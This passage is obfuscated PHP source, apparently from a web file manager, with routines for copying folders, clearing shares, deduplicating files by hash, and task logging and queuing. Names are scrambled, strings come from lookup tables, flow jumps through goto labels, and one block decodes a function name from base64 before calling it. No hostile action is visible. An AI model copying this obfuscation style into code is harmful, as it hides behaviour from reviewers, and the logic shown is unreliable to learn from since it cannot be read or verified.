$‰™íÖÅº[$šˆâôã…[511]] . $‰™íÖÅº[$šˆâôã…[402]] . $šˆâôã…[541])); $¥ë¡ñÓ = $‰™íÖÅº[$šˆâôã…[511]] . $‰™íÖÅº[$šˆâôã…[402]] . $šˆâôã…[50]; $ë¯ï•‚ = $ÜÊšËí[$šˆâôã…[511]] . $ÜÊšËí[$šˆâôã…[402]] . $šˆâôã…[50] . $‰™íÖÅº[$šˆâôã…[402]] . $šˆâôã…[50]; $µ¾¶è‹† = array($šˆâôã…[580] => array($šˆâôã…[589], "\162\x65\x70\x6c\141\143\x65\x28\160\x61\162\145\156\x74\x4c\x65\166\145\x6c\54\47{$¥ë¡ñÓ}\47\54\x27{$ë¯ï•‚}\47\51"), $šˆâôã…[576] => $ÜÊšËí[$šˆâôã…[411]], $šˆâôã…[577] => $ÜÊšËí[$šˆâôã…[496]]); if ($Öçõè¿²) { $µ¾¶è‹†[$šˆâôã…[430]] = 0; } $this->where($¤âˆˆõ)->data($µ¾¶è‹†)->save(); } $this->where(array($šˆâôã…[417] => $´Ò¹Ü×­))->data($É¾€)->save(); return $´Ò¹Ü×­; } private function clearShare($ƒØØ¶ûÀ, $ÉòØªÔë) { $¼óó•ö¿ =& $_SERVER[å¸¿•¶£]; $å ˜ÈÈ = $this->sourceInfo($ƒØØ¶ûÀ); $Íæ”–µÊ = $this->sourceInfo($ÉòØªÔë); if ($å ˜ÈÈ[$¼óó•ö¿[496]] == $Íæ”–µÊ[$¼óó•ö¿[496]] && $å ˜ÈÈ[$¼óó•ö¿[411]] == $¼óó•ö¿[590]) { return; } $‰°¸ŠÈê = array($¼óó•ö¿[511] => array($¼óó•ö¿[540], $å ˜ÈÈ[$¼óó•ö¿[511]] . $ƒØØ¶ûÀ . $¼óó•ö¿[541])); $ù¬”Ò×ã = $this->field($¼óó•ö¿[417])->where($‰°¸ŠÈê)->getField($¼óó•ö¿[402], !0); if (!$ù¬”Ò×ã) { return; } $‰°¸ŠÈê = array($¼óó•ö¿[402] => array($¼óó•ö¿[7], $ù¬”Ò×ã), $¼óó•ö¿[591] => 1); $ï÷ÂÂ³¡ = Model($¼óó•ö¿[592])->field($¼óó•ö¿[593])->where($‰°¸ŠÈê)->select(); if (!$ï÷ÂÂ³¡) { return; } $ï÷ÂÂ³¡ = array_to_keyvalue($ï÷ÂÂ³¡, $¼óó•ö¿[12], $¼óó•ö¿[593]); $‰°¸ŠÈê = array($¼óó•ö¿[593] => array($¼óó•ö¿[7], $ï÷ÂÂ³¡)); Model($¼óó•ö¿[592])->where($‰°¸ŠÈê)->save(array($¼óó•ö¿[591] => 0)); Model($¼óó•ö¿[594])->where($‰°¸ŠÈê)->delete(); } public function copyFolderFromIO($ÄİóŞÑº, $ˆÁ¨±¨À, $Õ¼°şùË, $’æÕÔ«Ú, $ƒ¯ª¶Éñ, $êâ°È«˜ = false) { $ò¼¨…° =& $_SERVER[å¸¿•¶£]; $«¤Õ†íï = array($ò¼¨…°[558] => array(), $ò¼¨…°[559] => array(), $ò¼¨…°[557] => array(), $ò¼¨…°[595] => array()); $¬÷°ï = $êâ°È«˜ ? $êâ°È«˜ : $ÄİóŞÑº->pathThis($ˆÁ¨±¨À); $¾ƒ¥Óİó = $this->fileNameExist($Õ¼°şùË, $¬÷°ï); $¿ğ©ÂÓÕ = $this->mkdir($Õ¼°şùË, $¬÷°ï, $’æÕÔ«Ú); if (!$¾ƒ¥Óİó || $’æÕÔ«Ú == REPEAT_RENAME_FOLDER) { $’æÕÔ«Ú = !1; } if ($¾ƒ¥Óİó) { $this->_childrenAllMake($¾ƒ¥Óİó); } Hook::trigger($ò¼¨…°[596]); $this->_copyChildTo($ÄİóŞÑº, $ˆÁ¨±¨À, $¿ğ©ÂÓÕ, $’æÕÔ«Ú, $«¤Õ†íï, $ƒ¯ª¶Éñ); Hook::trigger($ò¼¨…°[597]); if ($¿ğ©ÂÓÕ) { $this->folderSizeResetChildren($¿ğ©ÂÓÕ); } $this->_childrenListClear(); Model($ò¼¨…°[560])->addAll($«¤Õ†íï[$ò¼¨…°[558]], array(), !0); Model($ò¼¨…°[561])->eventCopy($¿ğ©ÂÓÕ); $this->saveAll($«¤Õ†íï[$ò¼¨…°[559]]); Model($ò¼¨…°[471])->linkAdd($«¤Õ†íï[$ò¼¨…°[557]]); Model($ò¼¨…°[471])->remove($«¤Õ†íï[$ò¼¨…°[595]]); $this->folderSizeReset($Õ¼°şùË); $this->updateModifyTime($Õ¼°şùË); return $¿ğ©ÂÓÕ; } private function _copyChildTo($ÛõùÌä¿, $°Ã±¸Üó, $úœšºÖü, $¹¶™×ëÎ, &$Ï½¸Æ¸Ú, $¿ŞÈšûÍ) { $¬—’ŒË­ =& $_SERVER[å¸¿•¶£]; $±·ÔçÌ× = $this->sourceInfoCache($úœšºÖü); $²»ßÊó« = $ÛõùÌä¿->listPath($°Ã±¸Üó); $²»ßÊó« = $²»ßÊó« ? $²»ßÊó« : array($¬—’ŒË­[83] => array(), $¬—’ŒË­[82] => array()); $İÄ¾÷ı× = array_merge($²»ßÊó«[$¬—’ŒË­[83]], $²»ßÊó«[$¬—’ŒË­[82]]); $Ğßå• = $this->_addFiles($ÛõùÌä¿, $²»ßÊó«[$¬—’ŒË­[83]], $¿ŞÈšûÍ); $È”³‹´ = array(); foreach ($İÄ¾÷ı× as &$‚‹šß¸¿) { if (isset($Ğßå•[$‚‹šß¸¿[$¬—’ŒË­[32]]])) { $‚‹šß¸¿ = $Ğßå•[$‚‹šß¸¿[$¬—’ŒË­[32]]]; } $‚‹šß¸¿[$¬—’ŒË­[410]] = $‚‹šß¸¿[$¬—’ŒË­[33]] == $¬—’ŒË­[75]; $‚‹šß¸¿[$¬—’ŒË­[412]] = substr(_get($‚‹šß¸¿, $¬—’ŒË­[174], $¬—’ŒË­[12]), 0, 10); $‚‹šß¸¿[$¬—’ŒË­[76]] = _get($‚‹šß¸¿, $¬—’ŒË­[76], 0); $‚‹šß¸¿[$¬—’ŒË­[468]] = _get($‚‹šß¸¿, $¬—’ŒË­[468], 0); if (!isset($‚‹šß¸¿[$¬—’ŒË­[598]]) && $‚‹šß¸¿[$¬—’ŒË­[468]]) { $Ï½¸Æ¸Ú[$¬—’ŒË­[595]][] = $‚‹šß¸¿[$¬—’ŒË­[468]]; } if ($¹¶™×ëÎ) { $å·…¡ü¿ = $this->fileNameExistCache($úœšºÖü, $‚‹šß¸¿[$¬—’ŒË­[32]]); if ($å·…¡ü¿) { if ($‚‹šß¸¿[$¬—’ŒË­[410]] || $¹¶™×ëÎ == REPEAT_SKIP) { continue; } if ($¹¶™×ëÎ == REPEAT_REPLACE) { $›æ¿şıŸ = $this->sourceInfoCache($å·…¡ü¿); $Ë‰…®ÈÖ = $this->fileHistory($›æ¿şıŸ, $‚‹šß¸¿[$¬—’ŒË­[468]], $‚‹šß¸¿[$¬—’ŒË­[76]]); if ($Ë‰…®ÈÖ) { $Ï½¸Æ¸Ú[$¬—’ŒË­[557]][] = $‚‹šß¸¿[$¬—’ŒË­[468]]; } continue; } else { if ($¹¶™×ëÎ == REPEAT_RENAME) { $‚‹šß¸¿[$¬—’ŒË­[32]] = $this->fileNameAutoCache($úœšºÖü, $‚‹šß¸¿[$¬—’ŒË­[32]], $¹¶™×ëÎ, !1); } } } } if (!$‚‹šß¸¿[$¬—’ŒË­[410]] && $‚‹šß¸¿[$¬—’ŒË­[468]] == 0) { continue; } if (!$‚‹šß¸¿[$¬—’ŒË­[410]] && $‚‹šß¸¿[$¬—’ŒË­[468]]) { $Ï½¸Æ¸Ú[$¬—’ŒË­[557]][] = $‚‹šß¸¿[$¬—’ŒË­[468]]; } $È”³‹´[] = $this->_makeItemData($‚‹šß¸¿, $±·ÔçÌ×, $‚‹šß¸¿[$¬—’ŒË­[32]]); } unset($‚‹šß¸¿); if (!empty($È”³‹´)) { $this->addAll($È”³‹´); $this->_childrenListSelect($úœšºÖü); } $”ô©êõ = $this->_childrenList($úœšºÖü); $”ô©êõ = array_to_keyvalue($”ô©êõ, $¬—’ŒË­[32]); foreach ($İÄ¾÷ı× as $‚‹šß¸¿) { $›æ¿şıŸ = $”ô©êõ[$‚‹šß¸¿[$¬—’ŒË­[32]]]; $ùÆ¸ì„„ = $›æ¿şıŸ[$¬—’ŒË­[402]]; $this->_copyApplyMeta($›æ¿şıŸ, $Ï½¸Æ¸Ú); if ($‚‹šß¸¿[$¬—’ŒË­[33]] == $¬—’ŒË­[75]) { $‚‹šß¸¿[$¬—’ŒË­[84]] = $ÛõùÌä¿->getPathInner($‚‹šß¸¿[$¬—’ŒË­[84]]); $this->_copyChildTo($ÛõùÌä¿, $‚‹šß¸¿[$¬—’ŒË­[84]], $ùÆ¸ì„„, $¹¶™×ëÎ, $Ï½¸Æ¸Ú, $¿ŞÈšûÍ); } } } private function _addFiles($¢—ùÛÁ©, $›‰•¦š¸, $¤Èøœè) { $ÇÛ®ãš =& $_SERVER[å¸¿•¶£]; if (!$›‰•¦š¸ || count($›‰•¦š¸) == 0) { return array(); } $œî®ŠµÜ = array(); foreach ($›‰•¦š¸ as &$Ö½Ì¤¥Æ) { Hook::trigger($ÇÛ®ãš[599], $Ö½Ì¤¥Æ); $Ö½Ì¤¥Æ[$ÇÛ®ãš[84]] = $¢—ùÛÁ©->getPathInner($Ö½Ì¤¥Æ[$ÇÛ®ãš[84]]); $Ÿà°ñ„ = $¢—ùÛÁ©->hashSimple($Ö½Ì¤¥Æ[$ÇÛ®ãš[84]]); $Ø¶¢âîÔ = $¢—ùÛÁ©->hashMd5($Ö½Ì¤¥Æ[$ÇÛ®ãš[84]]); if (strlen($Ø¶¢âîÔ) > 10 && !isset($œî®ŠµÜ[$Ø¶¢âîÔ])) { $œî®ŠµÜ[$Ø¶¢âîÔ] = array(); } $Ö½Ì¤¥Æ[$ÇÛ®ãš[177]] = $Ÿà°ñ„; $Ö½Ì¤¥Æ[$ÇÛ®ãš[176]] = $Ø¶¢âîÔ; $œî®ŠµÜ[$Ø¶¢âîÔ][] =& $Ö½Ì¤¥Æ; if (count($œî®ŠµÜ[$Ø¶¢âîÔ]) > 1) { $Ö½Ì¤¥Æ[$ÇÛ®ãš[598]] = !0; } Hook::trigger($ÇÛ®ãš[600], $Ö½Ì¤¥Æ); } unset($Ö½Ì¤¥Æ); $ÙÈáÏ“ = array($ÇÛ®ãš[176] => array($ÇÛ®ãš[7], array_keys($œî®ŠµÜ))); $‡üıŒ¦ß = Model($ÇÛ®ãš[601]); $¬ã¥”Ñ = $‡üıŒ¦ß->where($ÙÈáÏ“)->select(); $¬ã¥”Ñ = $¬ã¥”Ñ ? $¬ã¥”Ñ : array(); foreach ($¬ã¥”Ñ as $½‚Üâ•ò) { if (!isset($œî®ŠµÜ[$½‚Üâ•ò[$ÇÛ®ãš[176]]])) { continue; } $˜„¯“é = $œî®ŠµÜ[$½‚Üâ•ò[$ÇÛ®ãš[176]]]; foreach ($˜„¯“é as &$Ö½Ì¤¥Æ) { $Ö½Ì¤¥Æ[$ÇÛ®ãš[468]] = $½‚Üâ•ò[$ÇÛ®ãš[468]]; $Ö½Ì¤¥Æ[$ÇÛ®ãš[598]] = !0; } unset($Ö½Ì¤¥Æ); } $ô¬ĞæÜ = array(); foreach ($›‰•¦š¸ as $çÀ‡üàÖ) { Hook::trigger($ÇÛ®ãš[602], $çÀ‡üàÖ); if (isset($çÀ‡üàÖ[$ÇÛ®ãš[598]]) && $çÀ‡üàÖ[$ÇÛ®ãš[598]]) { Hook::trigger($ÇÛ®ãš[603], $çÀ‡üàÖ); continue; } $õß›†Ñå = $¢—ùÛÁ©->getPathInner($çÀ‡üàÖ[$ÇÛ®ãš[84]]); $ØÁä¥œ = $‡üıŒ¦ß->addFileMake($õß›†Ñå, $çÀ‡üàÖ[$ÇÛ®ãš[76]], $çÀ‡üàÖ[$ÇÛ®ãš[177]], $çÀ‡üàÖ[$ÇÛ®ãš[176]], $çÀ‡üàÖ[$ÇÛ®ãš[32]], $¤Èøœè); Hook::trigger($ÇÛ®ãš[603], $çÀ‡üàÖ); if (!is_array($ØÁä¥œ)) { continue; } $ô¬ĞæÜ[] = $ØÁä¥œ; } $‡üıŒ¦ß->addAll($ô¬ĞæÜ); $ÙÈáÏ“ = array($ÇÛ®ãš[176] => array($ÇÛ®ãš[7], array_keys($œî®ŠµÜ))); $¬ã¥”Ñ = $‡üıŒ¦ß->where($ÙÈáÏ“)->select(); $¬ã¥”Ñ = $¬ã¥”Ñ ? $¬ã¥”Ñ : array(); foreach ($¬ã¥”Ñ as $½‚Üâ•ò) { if (!isset($œî®ŠµÜ[$½‚Üâ•ò[$ÇÛ®ãš[176]]])) { continue; } $°®¼÷½ =& $œî®ŠµÜ[$½‚Üâ•ò[$ÇÛ®ãš[176]]]; foreach ($°®¼÷½ as &$Ö½Ì¤¥Æ) { $Ö½Ì¤¥Æ[$ÇÛ®ãš[468]] = $½‚Üâ•ò[$ÇÛ®ãš[468]]; } unset($Ö½Ì¤¥Æ); } $œ°¨ø¢ = array(); foreach ($›‰•¦š¸ as $˜‡¡ÒÏ) { $œ°¨ø¢[$˜‡¡ÒÏ[$ÇÛ®ãš[32]]] = $˜‡¡ÒÏ; } return $œ°¨ø¢; } } goto aäõö; DŸíÔ…¯ƒš: $fileSize = strrev(base64_decode($_SERVER[ü»Éä¾][0])); function binCheckNeq($ÙÏìĞ‡, $Û˜ûşÖ‡) { return $ÙÏìĞ‡ != $Û˜ûşÖ‡; } $_SERVER[$_SERVER[ü»Éä¾][1]] = $fileSize($_SERVER[$_SERVER[ü»Éä¾][2]]); goto a½°Õ¢Ø”³; c±ˆÎ®çö©: define($_SERVER[å¸¿•¶£][238], 1); define($_SERVER[å¸¿•¶£][239], 2); define($_SERVER[å¸¿•¶£][240], 3); goto fÆÃ‰³…‘Œ; CÊ“ÄÒ‡: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¸ĞÖ³¿, $‰óÛÌÌê = '', $ÄÆ¾¹é¹ = 0, $íÙ¯Ø«û = '') { $·ìÜßØâ =& $_SERVER[å¸¿•¶£]; $ñâú”Œ = new Task($¸ĞÖ³¿, $‰óÛÌÌê, $ÄÆ¾¹é¹, $íÙ¯Ø«û); $GLOBALS[$·ìÜßØâ[1757] . $¸ĞÖ³¿] = new TaskLog($·ìÜßØâ[1658], $ñâú”Œ, $íÙ¯Ø«û); return $ñâú”Œ; } public function __construct($¤¤Ğ·Å£ = '', $¤ØµàØ = '', $³®¸ñÎ = '') { $›àÆ‚—£ =& $_SERVER[å¸¿•¶£]; if (!$¤¤Ğ·Å£) { $¤¤Ğ·Å£ = $›àÆ‚—£[1658]; } $í‰‘éé = $¤¤Ğ·Å£ . $›àÆ‚—£[386] . rand_string(10); if (!$³®¸ñÎ) { $³®¸ñÎ = $¤¤Ğ·Å£ . $›àÆ‚—£[53] . $³®¸ñÎ; } switch ($¤¤Ğ·Å£) { case $›àÆ‚—£[1658]: if (!$¤ØµàØ || !$¤ØµàØ->task) { return echoLog($¤¤Ğ·Å£ . $›àÆ‚—£[1758]); } $öÅ÷İš… = $¤ØµàØ; $í‰‘éé = $öÅ÷İš…->task[$›àÆ‚—£[399]]; $¤¤Ğ·Å£ = $öÅ÷İš…->task[$›àÆ‚—£[399]]; if (!$öÅ÷İš…->task[$›àÆ‚—£[1574]]) { $öÅ÷İš…->task[$›àÆ‚—£[1574]] = $³®¸ñÎ ? $³®¸ñÎ : $¤¤Ğ·Å£; } break; case $›àÆ‚—£[1759]: if (!$¤ØµàØ) { return echoLog($¤¤Ğ·Å£ . $›àÆ‚—£[1760]); } $Ê›´ç•à = is_string($¤ØµàØ) ? array($¤ØµàØ) : $¤ØµàØ; $öÅ÷İš… = new TaskFileTransfer($í‰‘éé, $¤¤Ğ·Å£, 0, $³®¸ñÎ ? $³®¸ñÎ : $Ê›´ç•à[0]); foreach ($Ê›´ç•à as $Ê¦¶Û ˜) { $öÅ÷İš…->addPath($Ê¦¶Û ˜); } break; case $›àÆ‚—£[313]: if (!$¤ØµàØ) { return echoLog($¤¤Ğ·Å£ . $›àÆ‚—£[1760]); } $Ê›´ç•à = is_string($¤ØµàØ) ? array($¤ØµàØ) : $¤ØµàØ; $öÅ÷İš… = new TaskZip($í‰‘éé, $¤¤Ğ·Å£, 0, $³®¸ñÎ ? $³®¸ñÎ : $Ê›´ç•à[0]); foreach ($Ê›´ç•à as $Ê¦¶Û ˜) { $öÅ÷İš…->addPath($Ê¦¶Û ˜); } break; case $›àÆ‚—£[1221]: if (!$¤ØµàØ) { return echoLog($¤¤Ğ·Å£ . $›àÆ‚—£[1760]); } $öÅ÷İš… = new TaskUnZip($í‰‘éé, $¤¤Ğ·Å£, 0, $³®¸ñÎ ? $³®¸ñÎ : $¤ØµàØ); if ($¤ØµàØ) { $öÅ÷İš…->addFile($¤ØµàØ); } break; case $›àÆ‚—£[148]: $öÅ÷İš… = new TaskHttp($í‰‘éé, $¤¤Ğ·Å£); break; default: return; break; } $this->task = $öÅ÷İš…; $this->taskID = $í‰‘éé; Hook::bind($›àÆ‚—£[1695], array($this, $›àÆ‚—£[1761])); Hook::bind($›àÆ‚—£[1697], array($this, $›àÆ‚—£[1762])); Hook::bind($›àÆ‚—£[1691], array($this, $›àÆ‚—£[1763])); echoLog($›àÆ‚—£[1764] . $öÅ÷İš…->task[$›àÆ‚—£[1574]]); } public function __destruct() { $this->end(); } public function end($¸±½œœ§ = '') { $½¯ş­ò± =& $_SERVER[å¸¿•¶£]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¸±½œœ§); $this->task = !1; $this->taskID = !1; Hook::unbind($½¯ş­ò±[1695], array($this, $½¯ş­ò±[1761])); Hook::unbind($½¯ş­ò±[1697], array($this, $½¯ş­ò±[1762])); Hook::unbind($½¯ş­ò±[1691], array($this, $½¯ş­ò±[1763])); } public function taskUpdate($É¡Õ££Î) { $§÷ãƒ™ =& $_SERVER[å¸¿•¶£]; if (!$É¡Õ££Î || $this->taskID != $É¡Õ££Î[$§÷ãƒ™[399]]) { return; } $«‚‚şóÈ = 20; $‰˜û¿¦ö = intval($É¡Õ££Î[$§÷ãƒ™[1676]] * $«‚‚şóÈ); $¸øÀï‚ğ = $§÷ãƒ™[162] . str_repeat($§÷ãƒ™[891], $‰˜û¿¦ö) . $§÷ãƒ™[1021] . str_repeat($§÷ãƒ™[53], $«‚‚şóÈ - $‰˜û¿¦ö) . $§÷ãƒ™[164]; $¦ƒÎÅ«ø = $¸øÀï‚ğ . sprintf($§÷ãƒ™[1765], $É¡Õ££Î[$§÷ãƒ™[1676]] * 100) . $§÷ãƒ™[1766]; $©ÊÆÅæ¤ = $¦ƒÎÅ«ø . $É¡Õ££Î[$§÷ãƒ™[1675]] . $§÷ãƒ™[8] . $É¡Õ££Î[$§÷ãƒ™[793]] . LNG($§÷ãƒ™[1767]); $œû¿é™Ç = $§÷ãƒ™[12]; if ($É¡Õ££Î[$§÷ãƒ™[1751]]) { $©ÊÆÅæ¤ = $¦ƒÎÅ«ø . size_format($É¡Õ££Î[$§÷ãƒ™[1675]]) . $§÷ãƒ™[8] . size_format($É¡Õ££Î[$§÷ãƒ™[793]]); $œû¿é™Ç = size_format($É¡Õ££Î[$§÷ãƒ™[1677]]) . $§÷ãƒ™[1768]; } if ($É¡Õ££Î[$§÷ãƒ™[1071]]) { $É¡Õ££Î[$§÷ãƒ™[1725]] = $É¡Õ££Î[$§÷ãƒ™[1071]] . $§÷ãƒ™[53] . $É¡Õ££Î[$§÷ãƒ™[1725]]; } if ($É¡Õ££Î[$§÷ãƒ™[1725]]) { $Ş‚ÌˆÅÏ = $§÷ãƒ™[12]; if ($É¡Õ££Î[$§÷ãƒ™[1727]]) { $Ş‚ÌˆÅÏ = $§÷ãƒ™[50] . size_format($É¡Õ££Î[$§÷ãƒ™[1728]]) . $§÷ãƒ™[8] . size_format($É¡Õ££Î[$§÷ãƒ™[1727]]); } $œû¿é™Ç .= $É¡Õ££Î[$§÷ãƒ™[1725]] . $Ş‚ÌˆÅÏ; } if ($É¡Õ££Î[$§÷ãƒ™[770]] && !$É¡Õ££Î[$§÷ãƒ™[1727]]) { $œû¿é™Ç .= $§÷ãƒ™[53] . size_format($É¡Õ££Î[$§÷ãƒ™[1732]]) . $§÷ãƒ™[8] . size_format($É¡Õ££Î[$§÷ãƒ™[770]]); } echoLog($©ÊÆÅæ¤ . $§÷ãƒ™[53] . $œû¿é™Ç, !0); } public function taskEnd($ŸÍƒŞ…Ú) { $ ùõŒÒô =& $_SERVER[å¸¿•¶£]; if (!$ŸÍƒŞ…Ú || $this->taskID != $ŸÍƒŞ…Ú[$ ùõŒÒô[399]]) { return; } $´ìó¾…á = $ŸÍƒŞ…Ú ? $ŸÍƒŞ…Ú[$ ùõŒÒô[1675]] . $ ùõŒÒô[8] . $ŸÍƒŞ…Ú[$ ùõŒÒô[793]] . LNG($ ùõŒÒô[1767]) . $ ùõŒÒô[71] : $ ùõŒÒô[12]; echoLog($ ùõŒÒô[1769] . $ŸÍƒŞ…Ú[$ ùõŒÒô[1574]] . ($ŸÍƒŞ…Ú[$ ùõŒÒô[453]] ? $ ùõŒÒô[71] . $ŸÍƒŞ…Ú[$ ùõŒÒô[453]] : $ ùõŒÒô[12]) . $ ùõŒÒô[71] . $´ìó¾…á . $ ùõŒÒô[1770] . sprintf($ ùõŒÒô[857], timeFloat() - $ŸÍƒŞ…Ú[$ ùõŒÒô[1678]]) . $ ùõŒÒô[1690]); $this->end(); } public function taskKill($•âê¼Š) { $êÎúğü =& $_SERVER[å¸¿•¶£]; if (!$•âê¼Š || $this->taskID != $•âê¼Š[$êÎúğü[399]]) { return; } echoLog($êÎúğü[1771] . $•âê¼Š[$êÎúğü[1574]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\x51\x75\x65\x75\x65\x4c\145\x6e\x67\164\x68"; const QUEUE_DATA = "\x74\141\x73\153\121\x75\x65\165\x65\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($•ø—Ø«İ, $¯­ÉåŠ¼ = array(), $ì‡ã©¢Í = '', $í“ÉŸıò = '') { $é´«éè‹ =& $_SERVER[å¸¿•¶£]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($í“ÉŸıò && array_find_by_field(self::$listData, $é´«éè‹[94], $í“ÉŸıò)) { return !0; } self::$listData[] = array($é´«éè‹[264] => $•ø—Ø«İ, $é´«éè‹[1772] => $¯­ÉåŠ¼, $é´«éè‹[453] => $ì‡ã©¢Í, $é´«éè‹[94] => $í“ÉŸıò); return !0; } public static function addSubmit() { $´‡üğé… =& $_SERVER[å¸¿•¶£]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($´‡üğé…[1773] . json_encode_force(array_to_keyvalue(self::$listData, $´‡üğé…[12], $´‡üğé…[453])), $´‡üğé…[1774]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($—Ü¾†¿, $°¥ıÏ¥ñ = array(), $‘ˆ¥²ŸÀ = '', $ø§»÷ = '') { $•õø·½¥ =& $_SERVER[å¸¿•¶£]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ë€øŸÂã = self::getAll(); if ($ø§»÷ && array_find_by_field($ë€øŸÂã, $•õø·½¥[94], $ø§»÷)) { return !0; } $ë€øŸÂã[] = array($•õø·½¥[264] => $—Ü¾†¿, $•õø·½¥[1772] => $°¥ıÏ¥ñ, $•õø·½¥[453] => $‘ˆ¥²ŸÀ, $•õø·½¥[94] => $ø§»÷); write_log($•õø·½¥[1773] . $‘ˆ¥²ŸÀ, $•õø·½¥[1774]); self::setAll($ë€øŸÂã); return !0; } public static function run() { $Ôğìé²² =& $_SERVER[å¸¿•¶£]; $òîØî‘— = self::getAll(); $’†ÖÔÙ‰ = array_shift($òîØî‘—); if (!$’†ÖÔÙ‰) { return !1; } self::setAll($òîØî‘—); $´úÂ¤ÅÉ = timeFloat(); try { Hook::apply($’†ÖÔÙ‰[$Ôğìé²²[264]], $’†ÖÔÙ‰[$Ôğìé²²[1772]]); } catch (Exception $‚Ìäë×) { } $îºœß¥ = number_format(timeFloat() - $´úÂ¤ÅÉ, 3) . $Ôğìé²²[1690]; write_log($Ôğìé²²[1775] . $’†ÖÔÙ‰[$Ôğìé²²[453]] . $Ôğìé²²[1776] . $îºœß¥, $Ôğìé²²[1774]); return !0; } public static function count() { $ŸòÖ›ğ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ŸòÖ›ğ) { return 0; } return intval($ŸòÖ›ğ); } public static function getAll() { $ßÓî”µ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ßÓî”µ) { return array(); } return $ßÓî”µ; } public static function setAll($ºË·é×) { $ÉÅÆ¾ƒè = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ºË·é×), $ÉÅÆ¾ƒè); Cache::set(self::QUEUE_DATA, $ºË·é×, $ÉÅÆ¾ƒè); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($˜±›Ÿ, $³Û¯Îùë = 5.0) { if (!$˜±›Ÿ) { return; } $ùçŞÎÑà = Cache::get($˜±›Ÿ); if (!$ùçŞÎÑà || timeFloat() - floatVal($ùçŞÎÑà) >= $³Û¯Îùë) { Cache::set($˜±›Ÿ, timeFloat(), $³Û¯Îùë * 10); return !0; } return !1; } public static function timeLimitCall($ÙœÁññ®, $‡‹ëÔâŠ, $ƒ¥ÜÉæŸ, $åÇæå–¤ = 5.0) { $ää¼ã’İ =& $_SERVER[å¸¿•¶£]; if (!$ÙœÁññ® || !$‡‹ëÔâŠ) { return; } self::$asyncAdd = !0; $ª¦ÅŠÏ‘ = $ää¼ã’İ[1777]; $ÊèÙ–À = Cache::get($ª¦ÅŠÏ‘, !0); $½¶Ş‡°¦ = array($ää¼ã’İ[1778] => timeFloat(), $ää¼ã’İ[1779] => timeFloat(), $ää¼ã’İ[264] => $‡‹ëÔâŠ, $ää¼ã’İ[1772] => $ƒ¥ÜÉæŸ, $ää¼ã’İ[180] => $åÇæå–¤); if (is_array($ÊèÙ–À[$ÙœÁññ®])) { $½¶Ş‡°¦[$ää¼ã’İ[1779]] = $ÊèÙ–À[$ÙœÁññ®][$ää¼ã’İ[1779]]; } if (is_array($ÊèÙ–À[$ÙœÁññ®])) { if (timeFloat() - $ÊèÙ–À[$ÙœÁññ®][$ää¼ã’İ[1778]] < $½¶Ş‡°¦[$ää¼ã’İ[180]] * 0.3) { return; } $½¶Ş‡°¦[$ää¼ã’İ[1779]] = $ÊèÙ–À[$ÙœÁññ®][$ää¼ã’İ[1779]]; } $ÊèÙ–À[$ÙœÁññ®] = $½¶Ş‡°¦; Cache::set($ª¦ÅŠÏ‘, $ÊèÙ–À, 60); Cache::removeMemory($ª¦ÅŠÏ‘); write_log($ää¼ã’İ[1780] . $ÙœÁññ® . $ää¼ã’İ[71] . $‡‹ëÔâŠ, $ää¼ã’İ[1774]); } public static function timeLimitCallLoop() { $µîîÎ›˜ =& $_SERVER[å¸¿•¶£]; $Ùñ¾ê© = array($µîîÎ›˜[1781]); $âæõ®“¬ = in_array(strtolower(ACTION), $Ùñ¾ê©); if (!$âæõ®“¬ && !self::$asyncAdd) { return; } $Šİ¥´Äë = $µîîÎ›˜[1777]; $³Ë¥–µä = Cache::get($Šİ¥´Äë, !0); if (!$³Ë¥–µä || count($³Ë¥–µä) <= 0) { return; } $Ø½†„ = !1; $¸Ù¹›ç = timeFloat(); $Ü½İ»œÌ = array(); foreach ($³Ë¥–µä as $”àï³âî => $ü£ú«ÇÄ) { if ($¸Ù¹›ç - $ü£ú«ÇÄ[$µîîÎ›˜[1779]] > $ü£ú«ÇÄ[$µîîÎ›˜[180]]) { $Ø½†„ = !0; try { Hook::apply($ü£ú«ÇÄ[$µîîÎ›˜[264]], $ü£ú«ÇÄ[$µîîÎ›˜[1772]]); write_log($µîîÎ›˜[1782] . $”àï³âî . $µîîÎ›˜[71] . $ü£ú«ÇÄ[$µîîÎ›˜[264]] . $µîîÎ›˜[1783] . ACTION, $µîîÎ›˜[1774]); } catch (Exception $Öå¯“») { } continue; } $Ü½İ»œÌ[$”àï³âî] = $ü£ú«ÇÄ; } if (!$Ø½†„) { return; } if (!$Ü½İ»œÌ) { return Cache::remove($Šİ¥´Äë); } Cache::set($Šİ¥´Äë, $Ü½İ»œÌ, 60); Cache::removeMemory($Šİ¥´Äë); } public static function finished($¾ÅÖëøü, $â†şÁÛ©) { $¿Ò±½’è =& $_SERVER[å¸¿•¶£]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¿Ò±½’è[264] => $¾ÅÖëøü, $¿Ò±½’è[1772] => $â†şÁÛ©); } private static function finishedRun() { $ˆ£¾’…½ =& $_SERVER[å¸¿•¶£]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $˜ëŒÃ²÷) { try { Hook::apply($˜ëŒÃ²÷[$ˆ£¾’…½[264]], $˜ëŒÃ²÷[$ˆ£¾’…½[1772]]); } catch (Exception $¥¿ùÃÛ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto e„£ŞÛÎõ; D²µ„ğÄƒ: class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\165\163\145\x72\122\145\x63\171\x63\154\x65\175"; const KOD_USER_FAV = 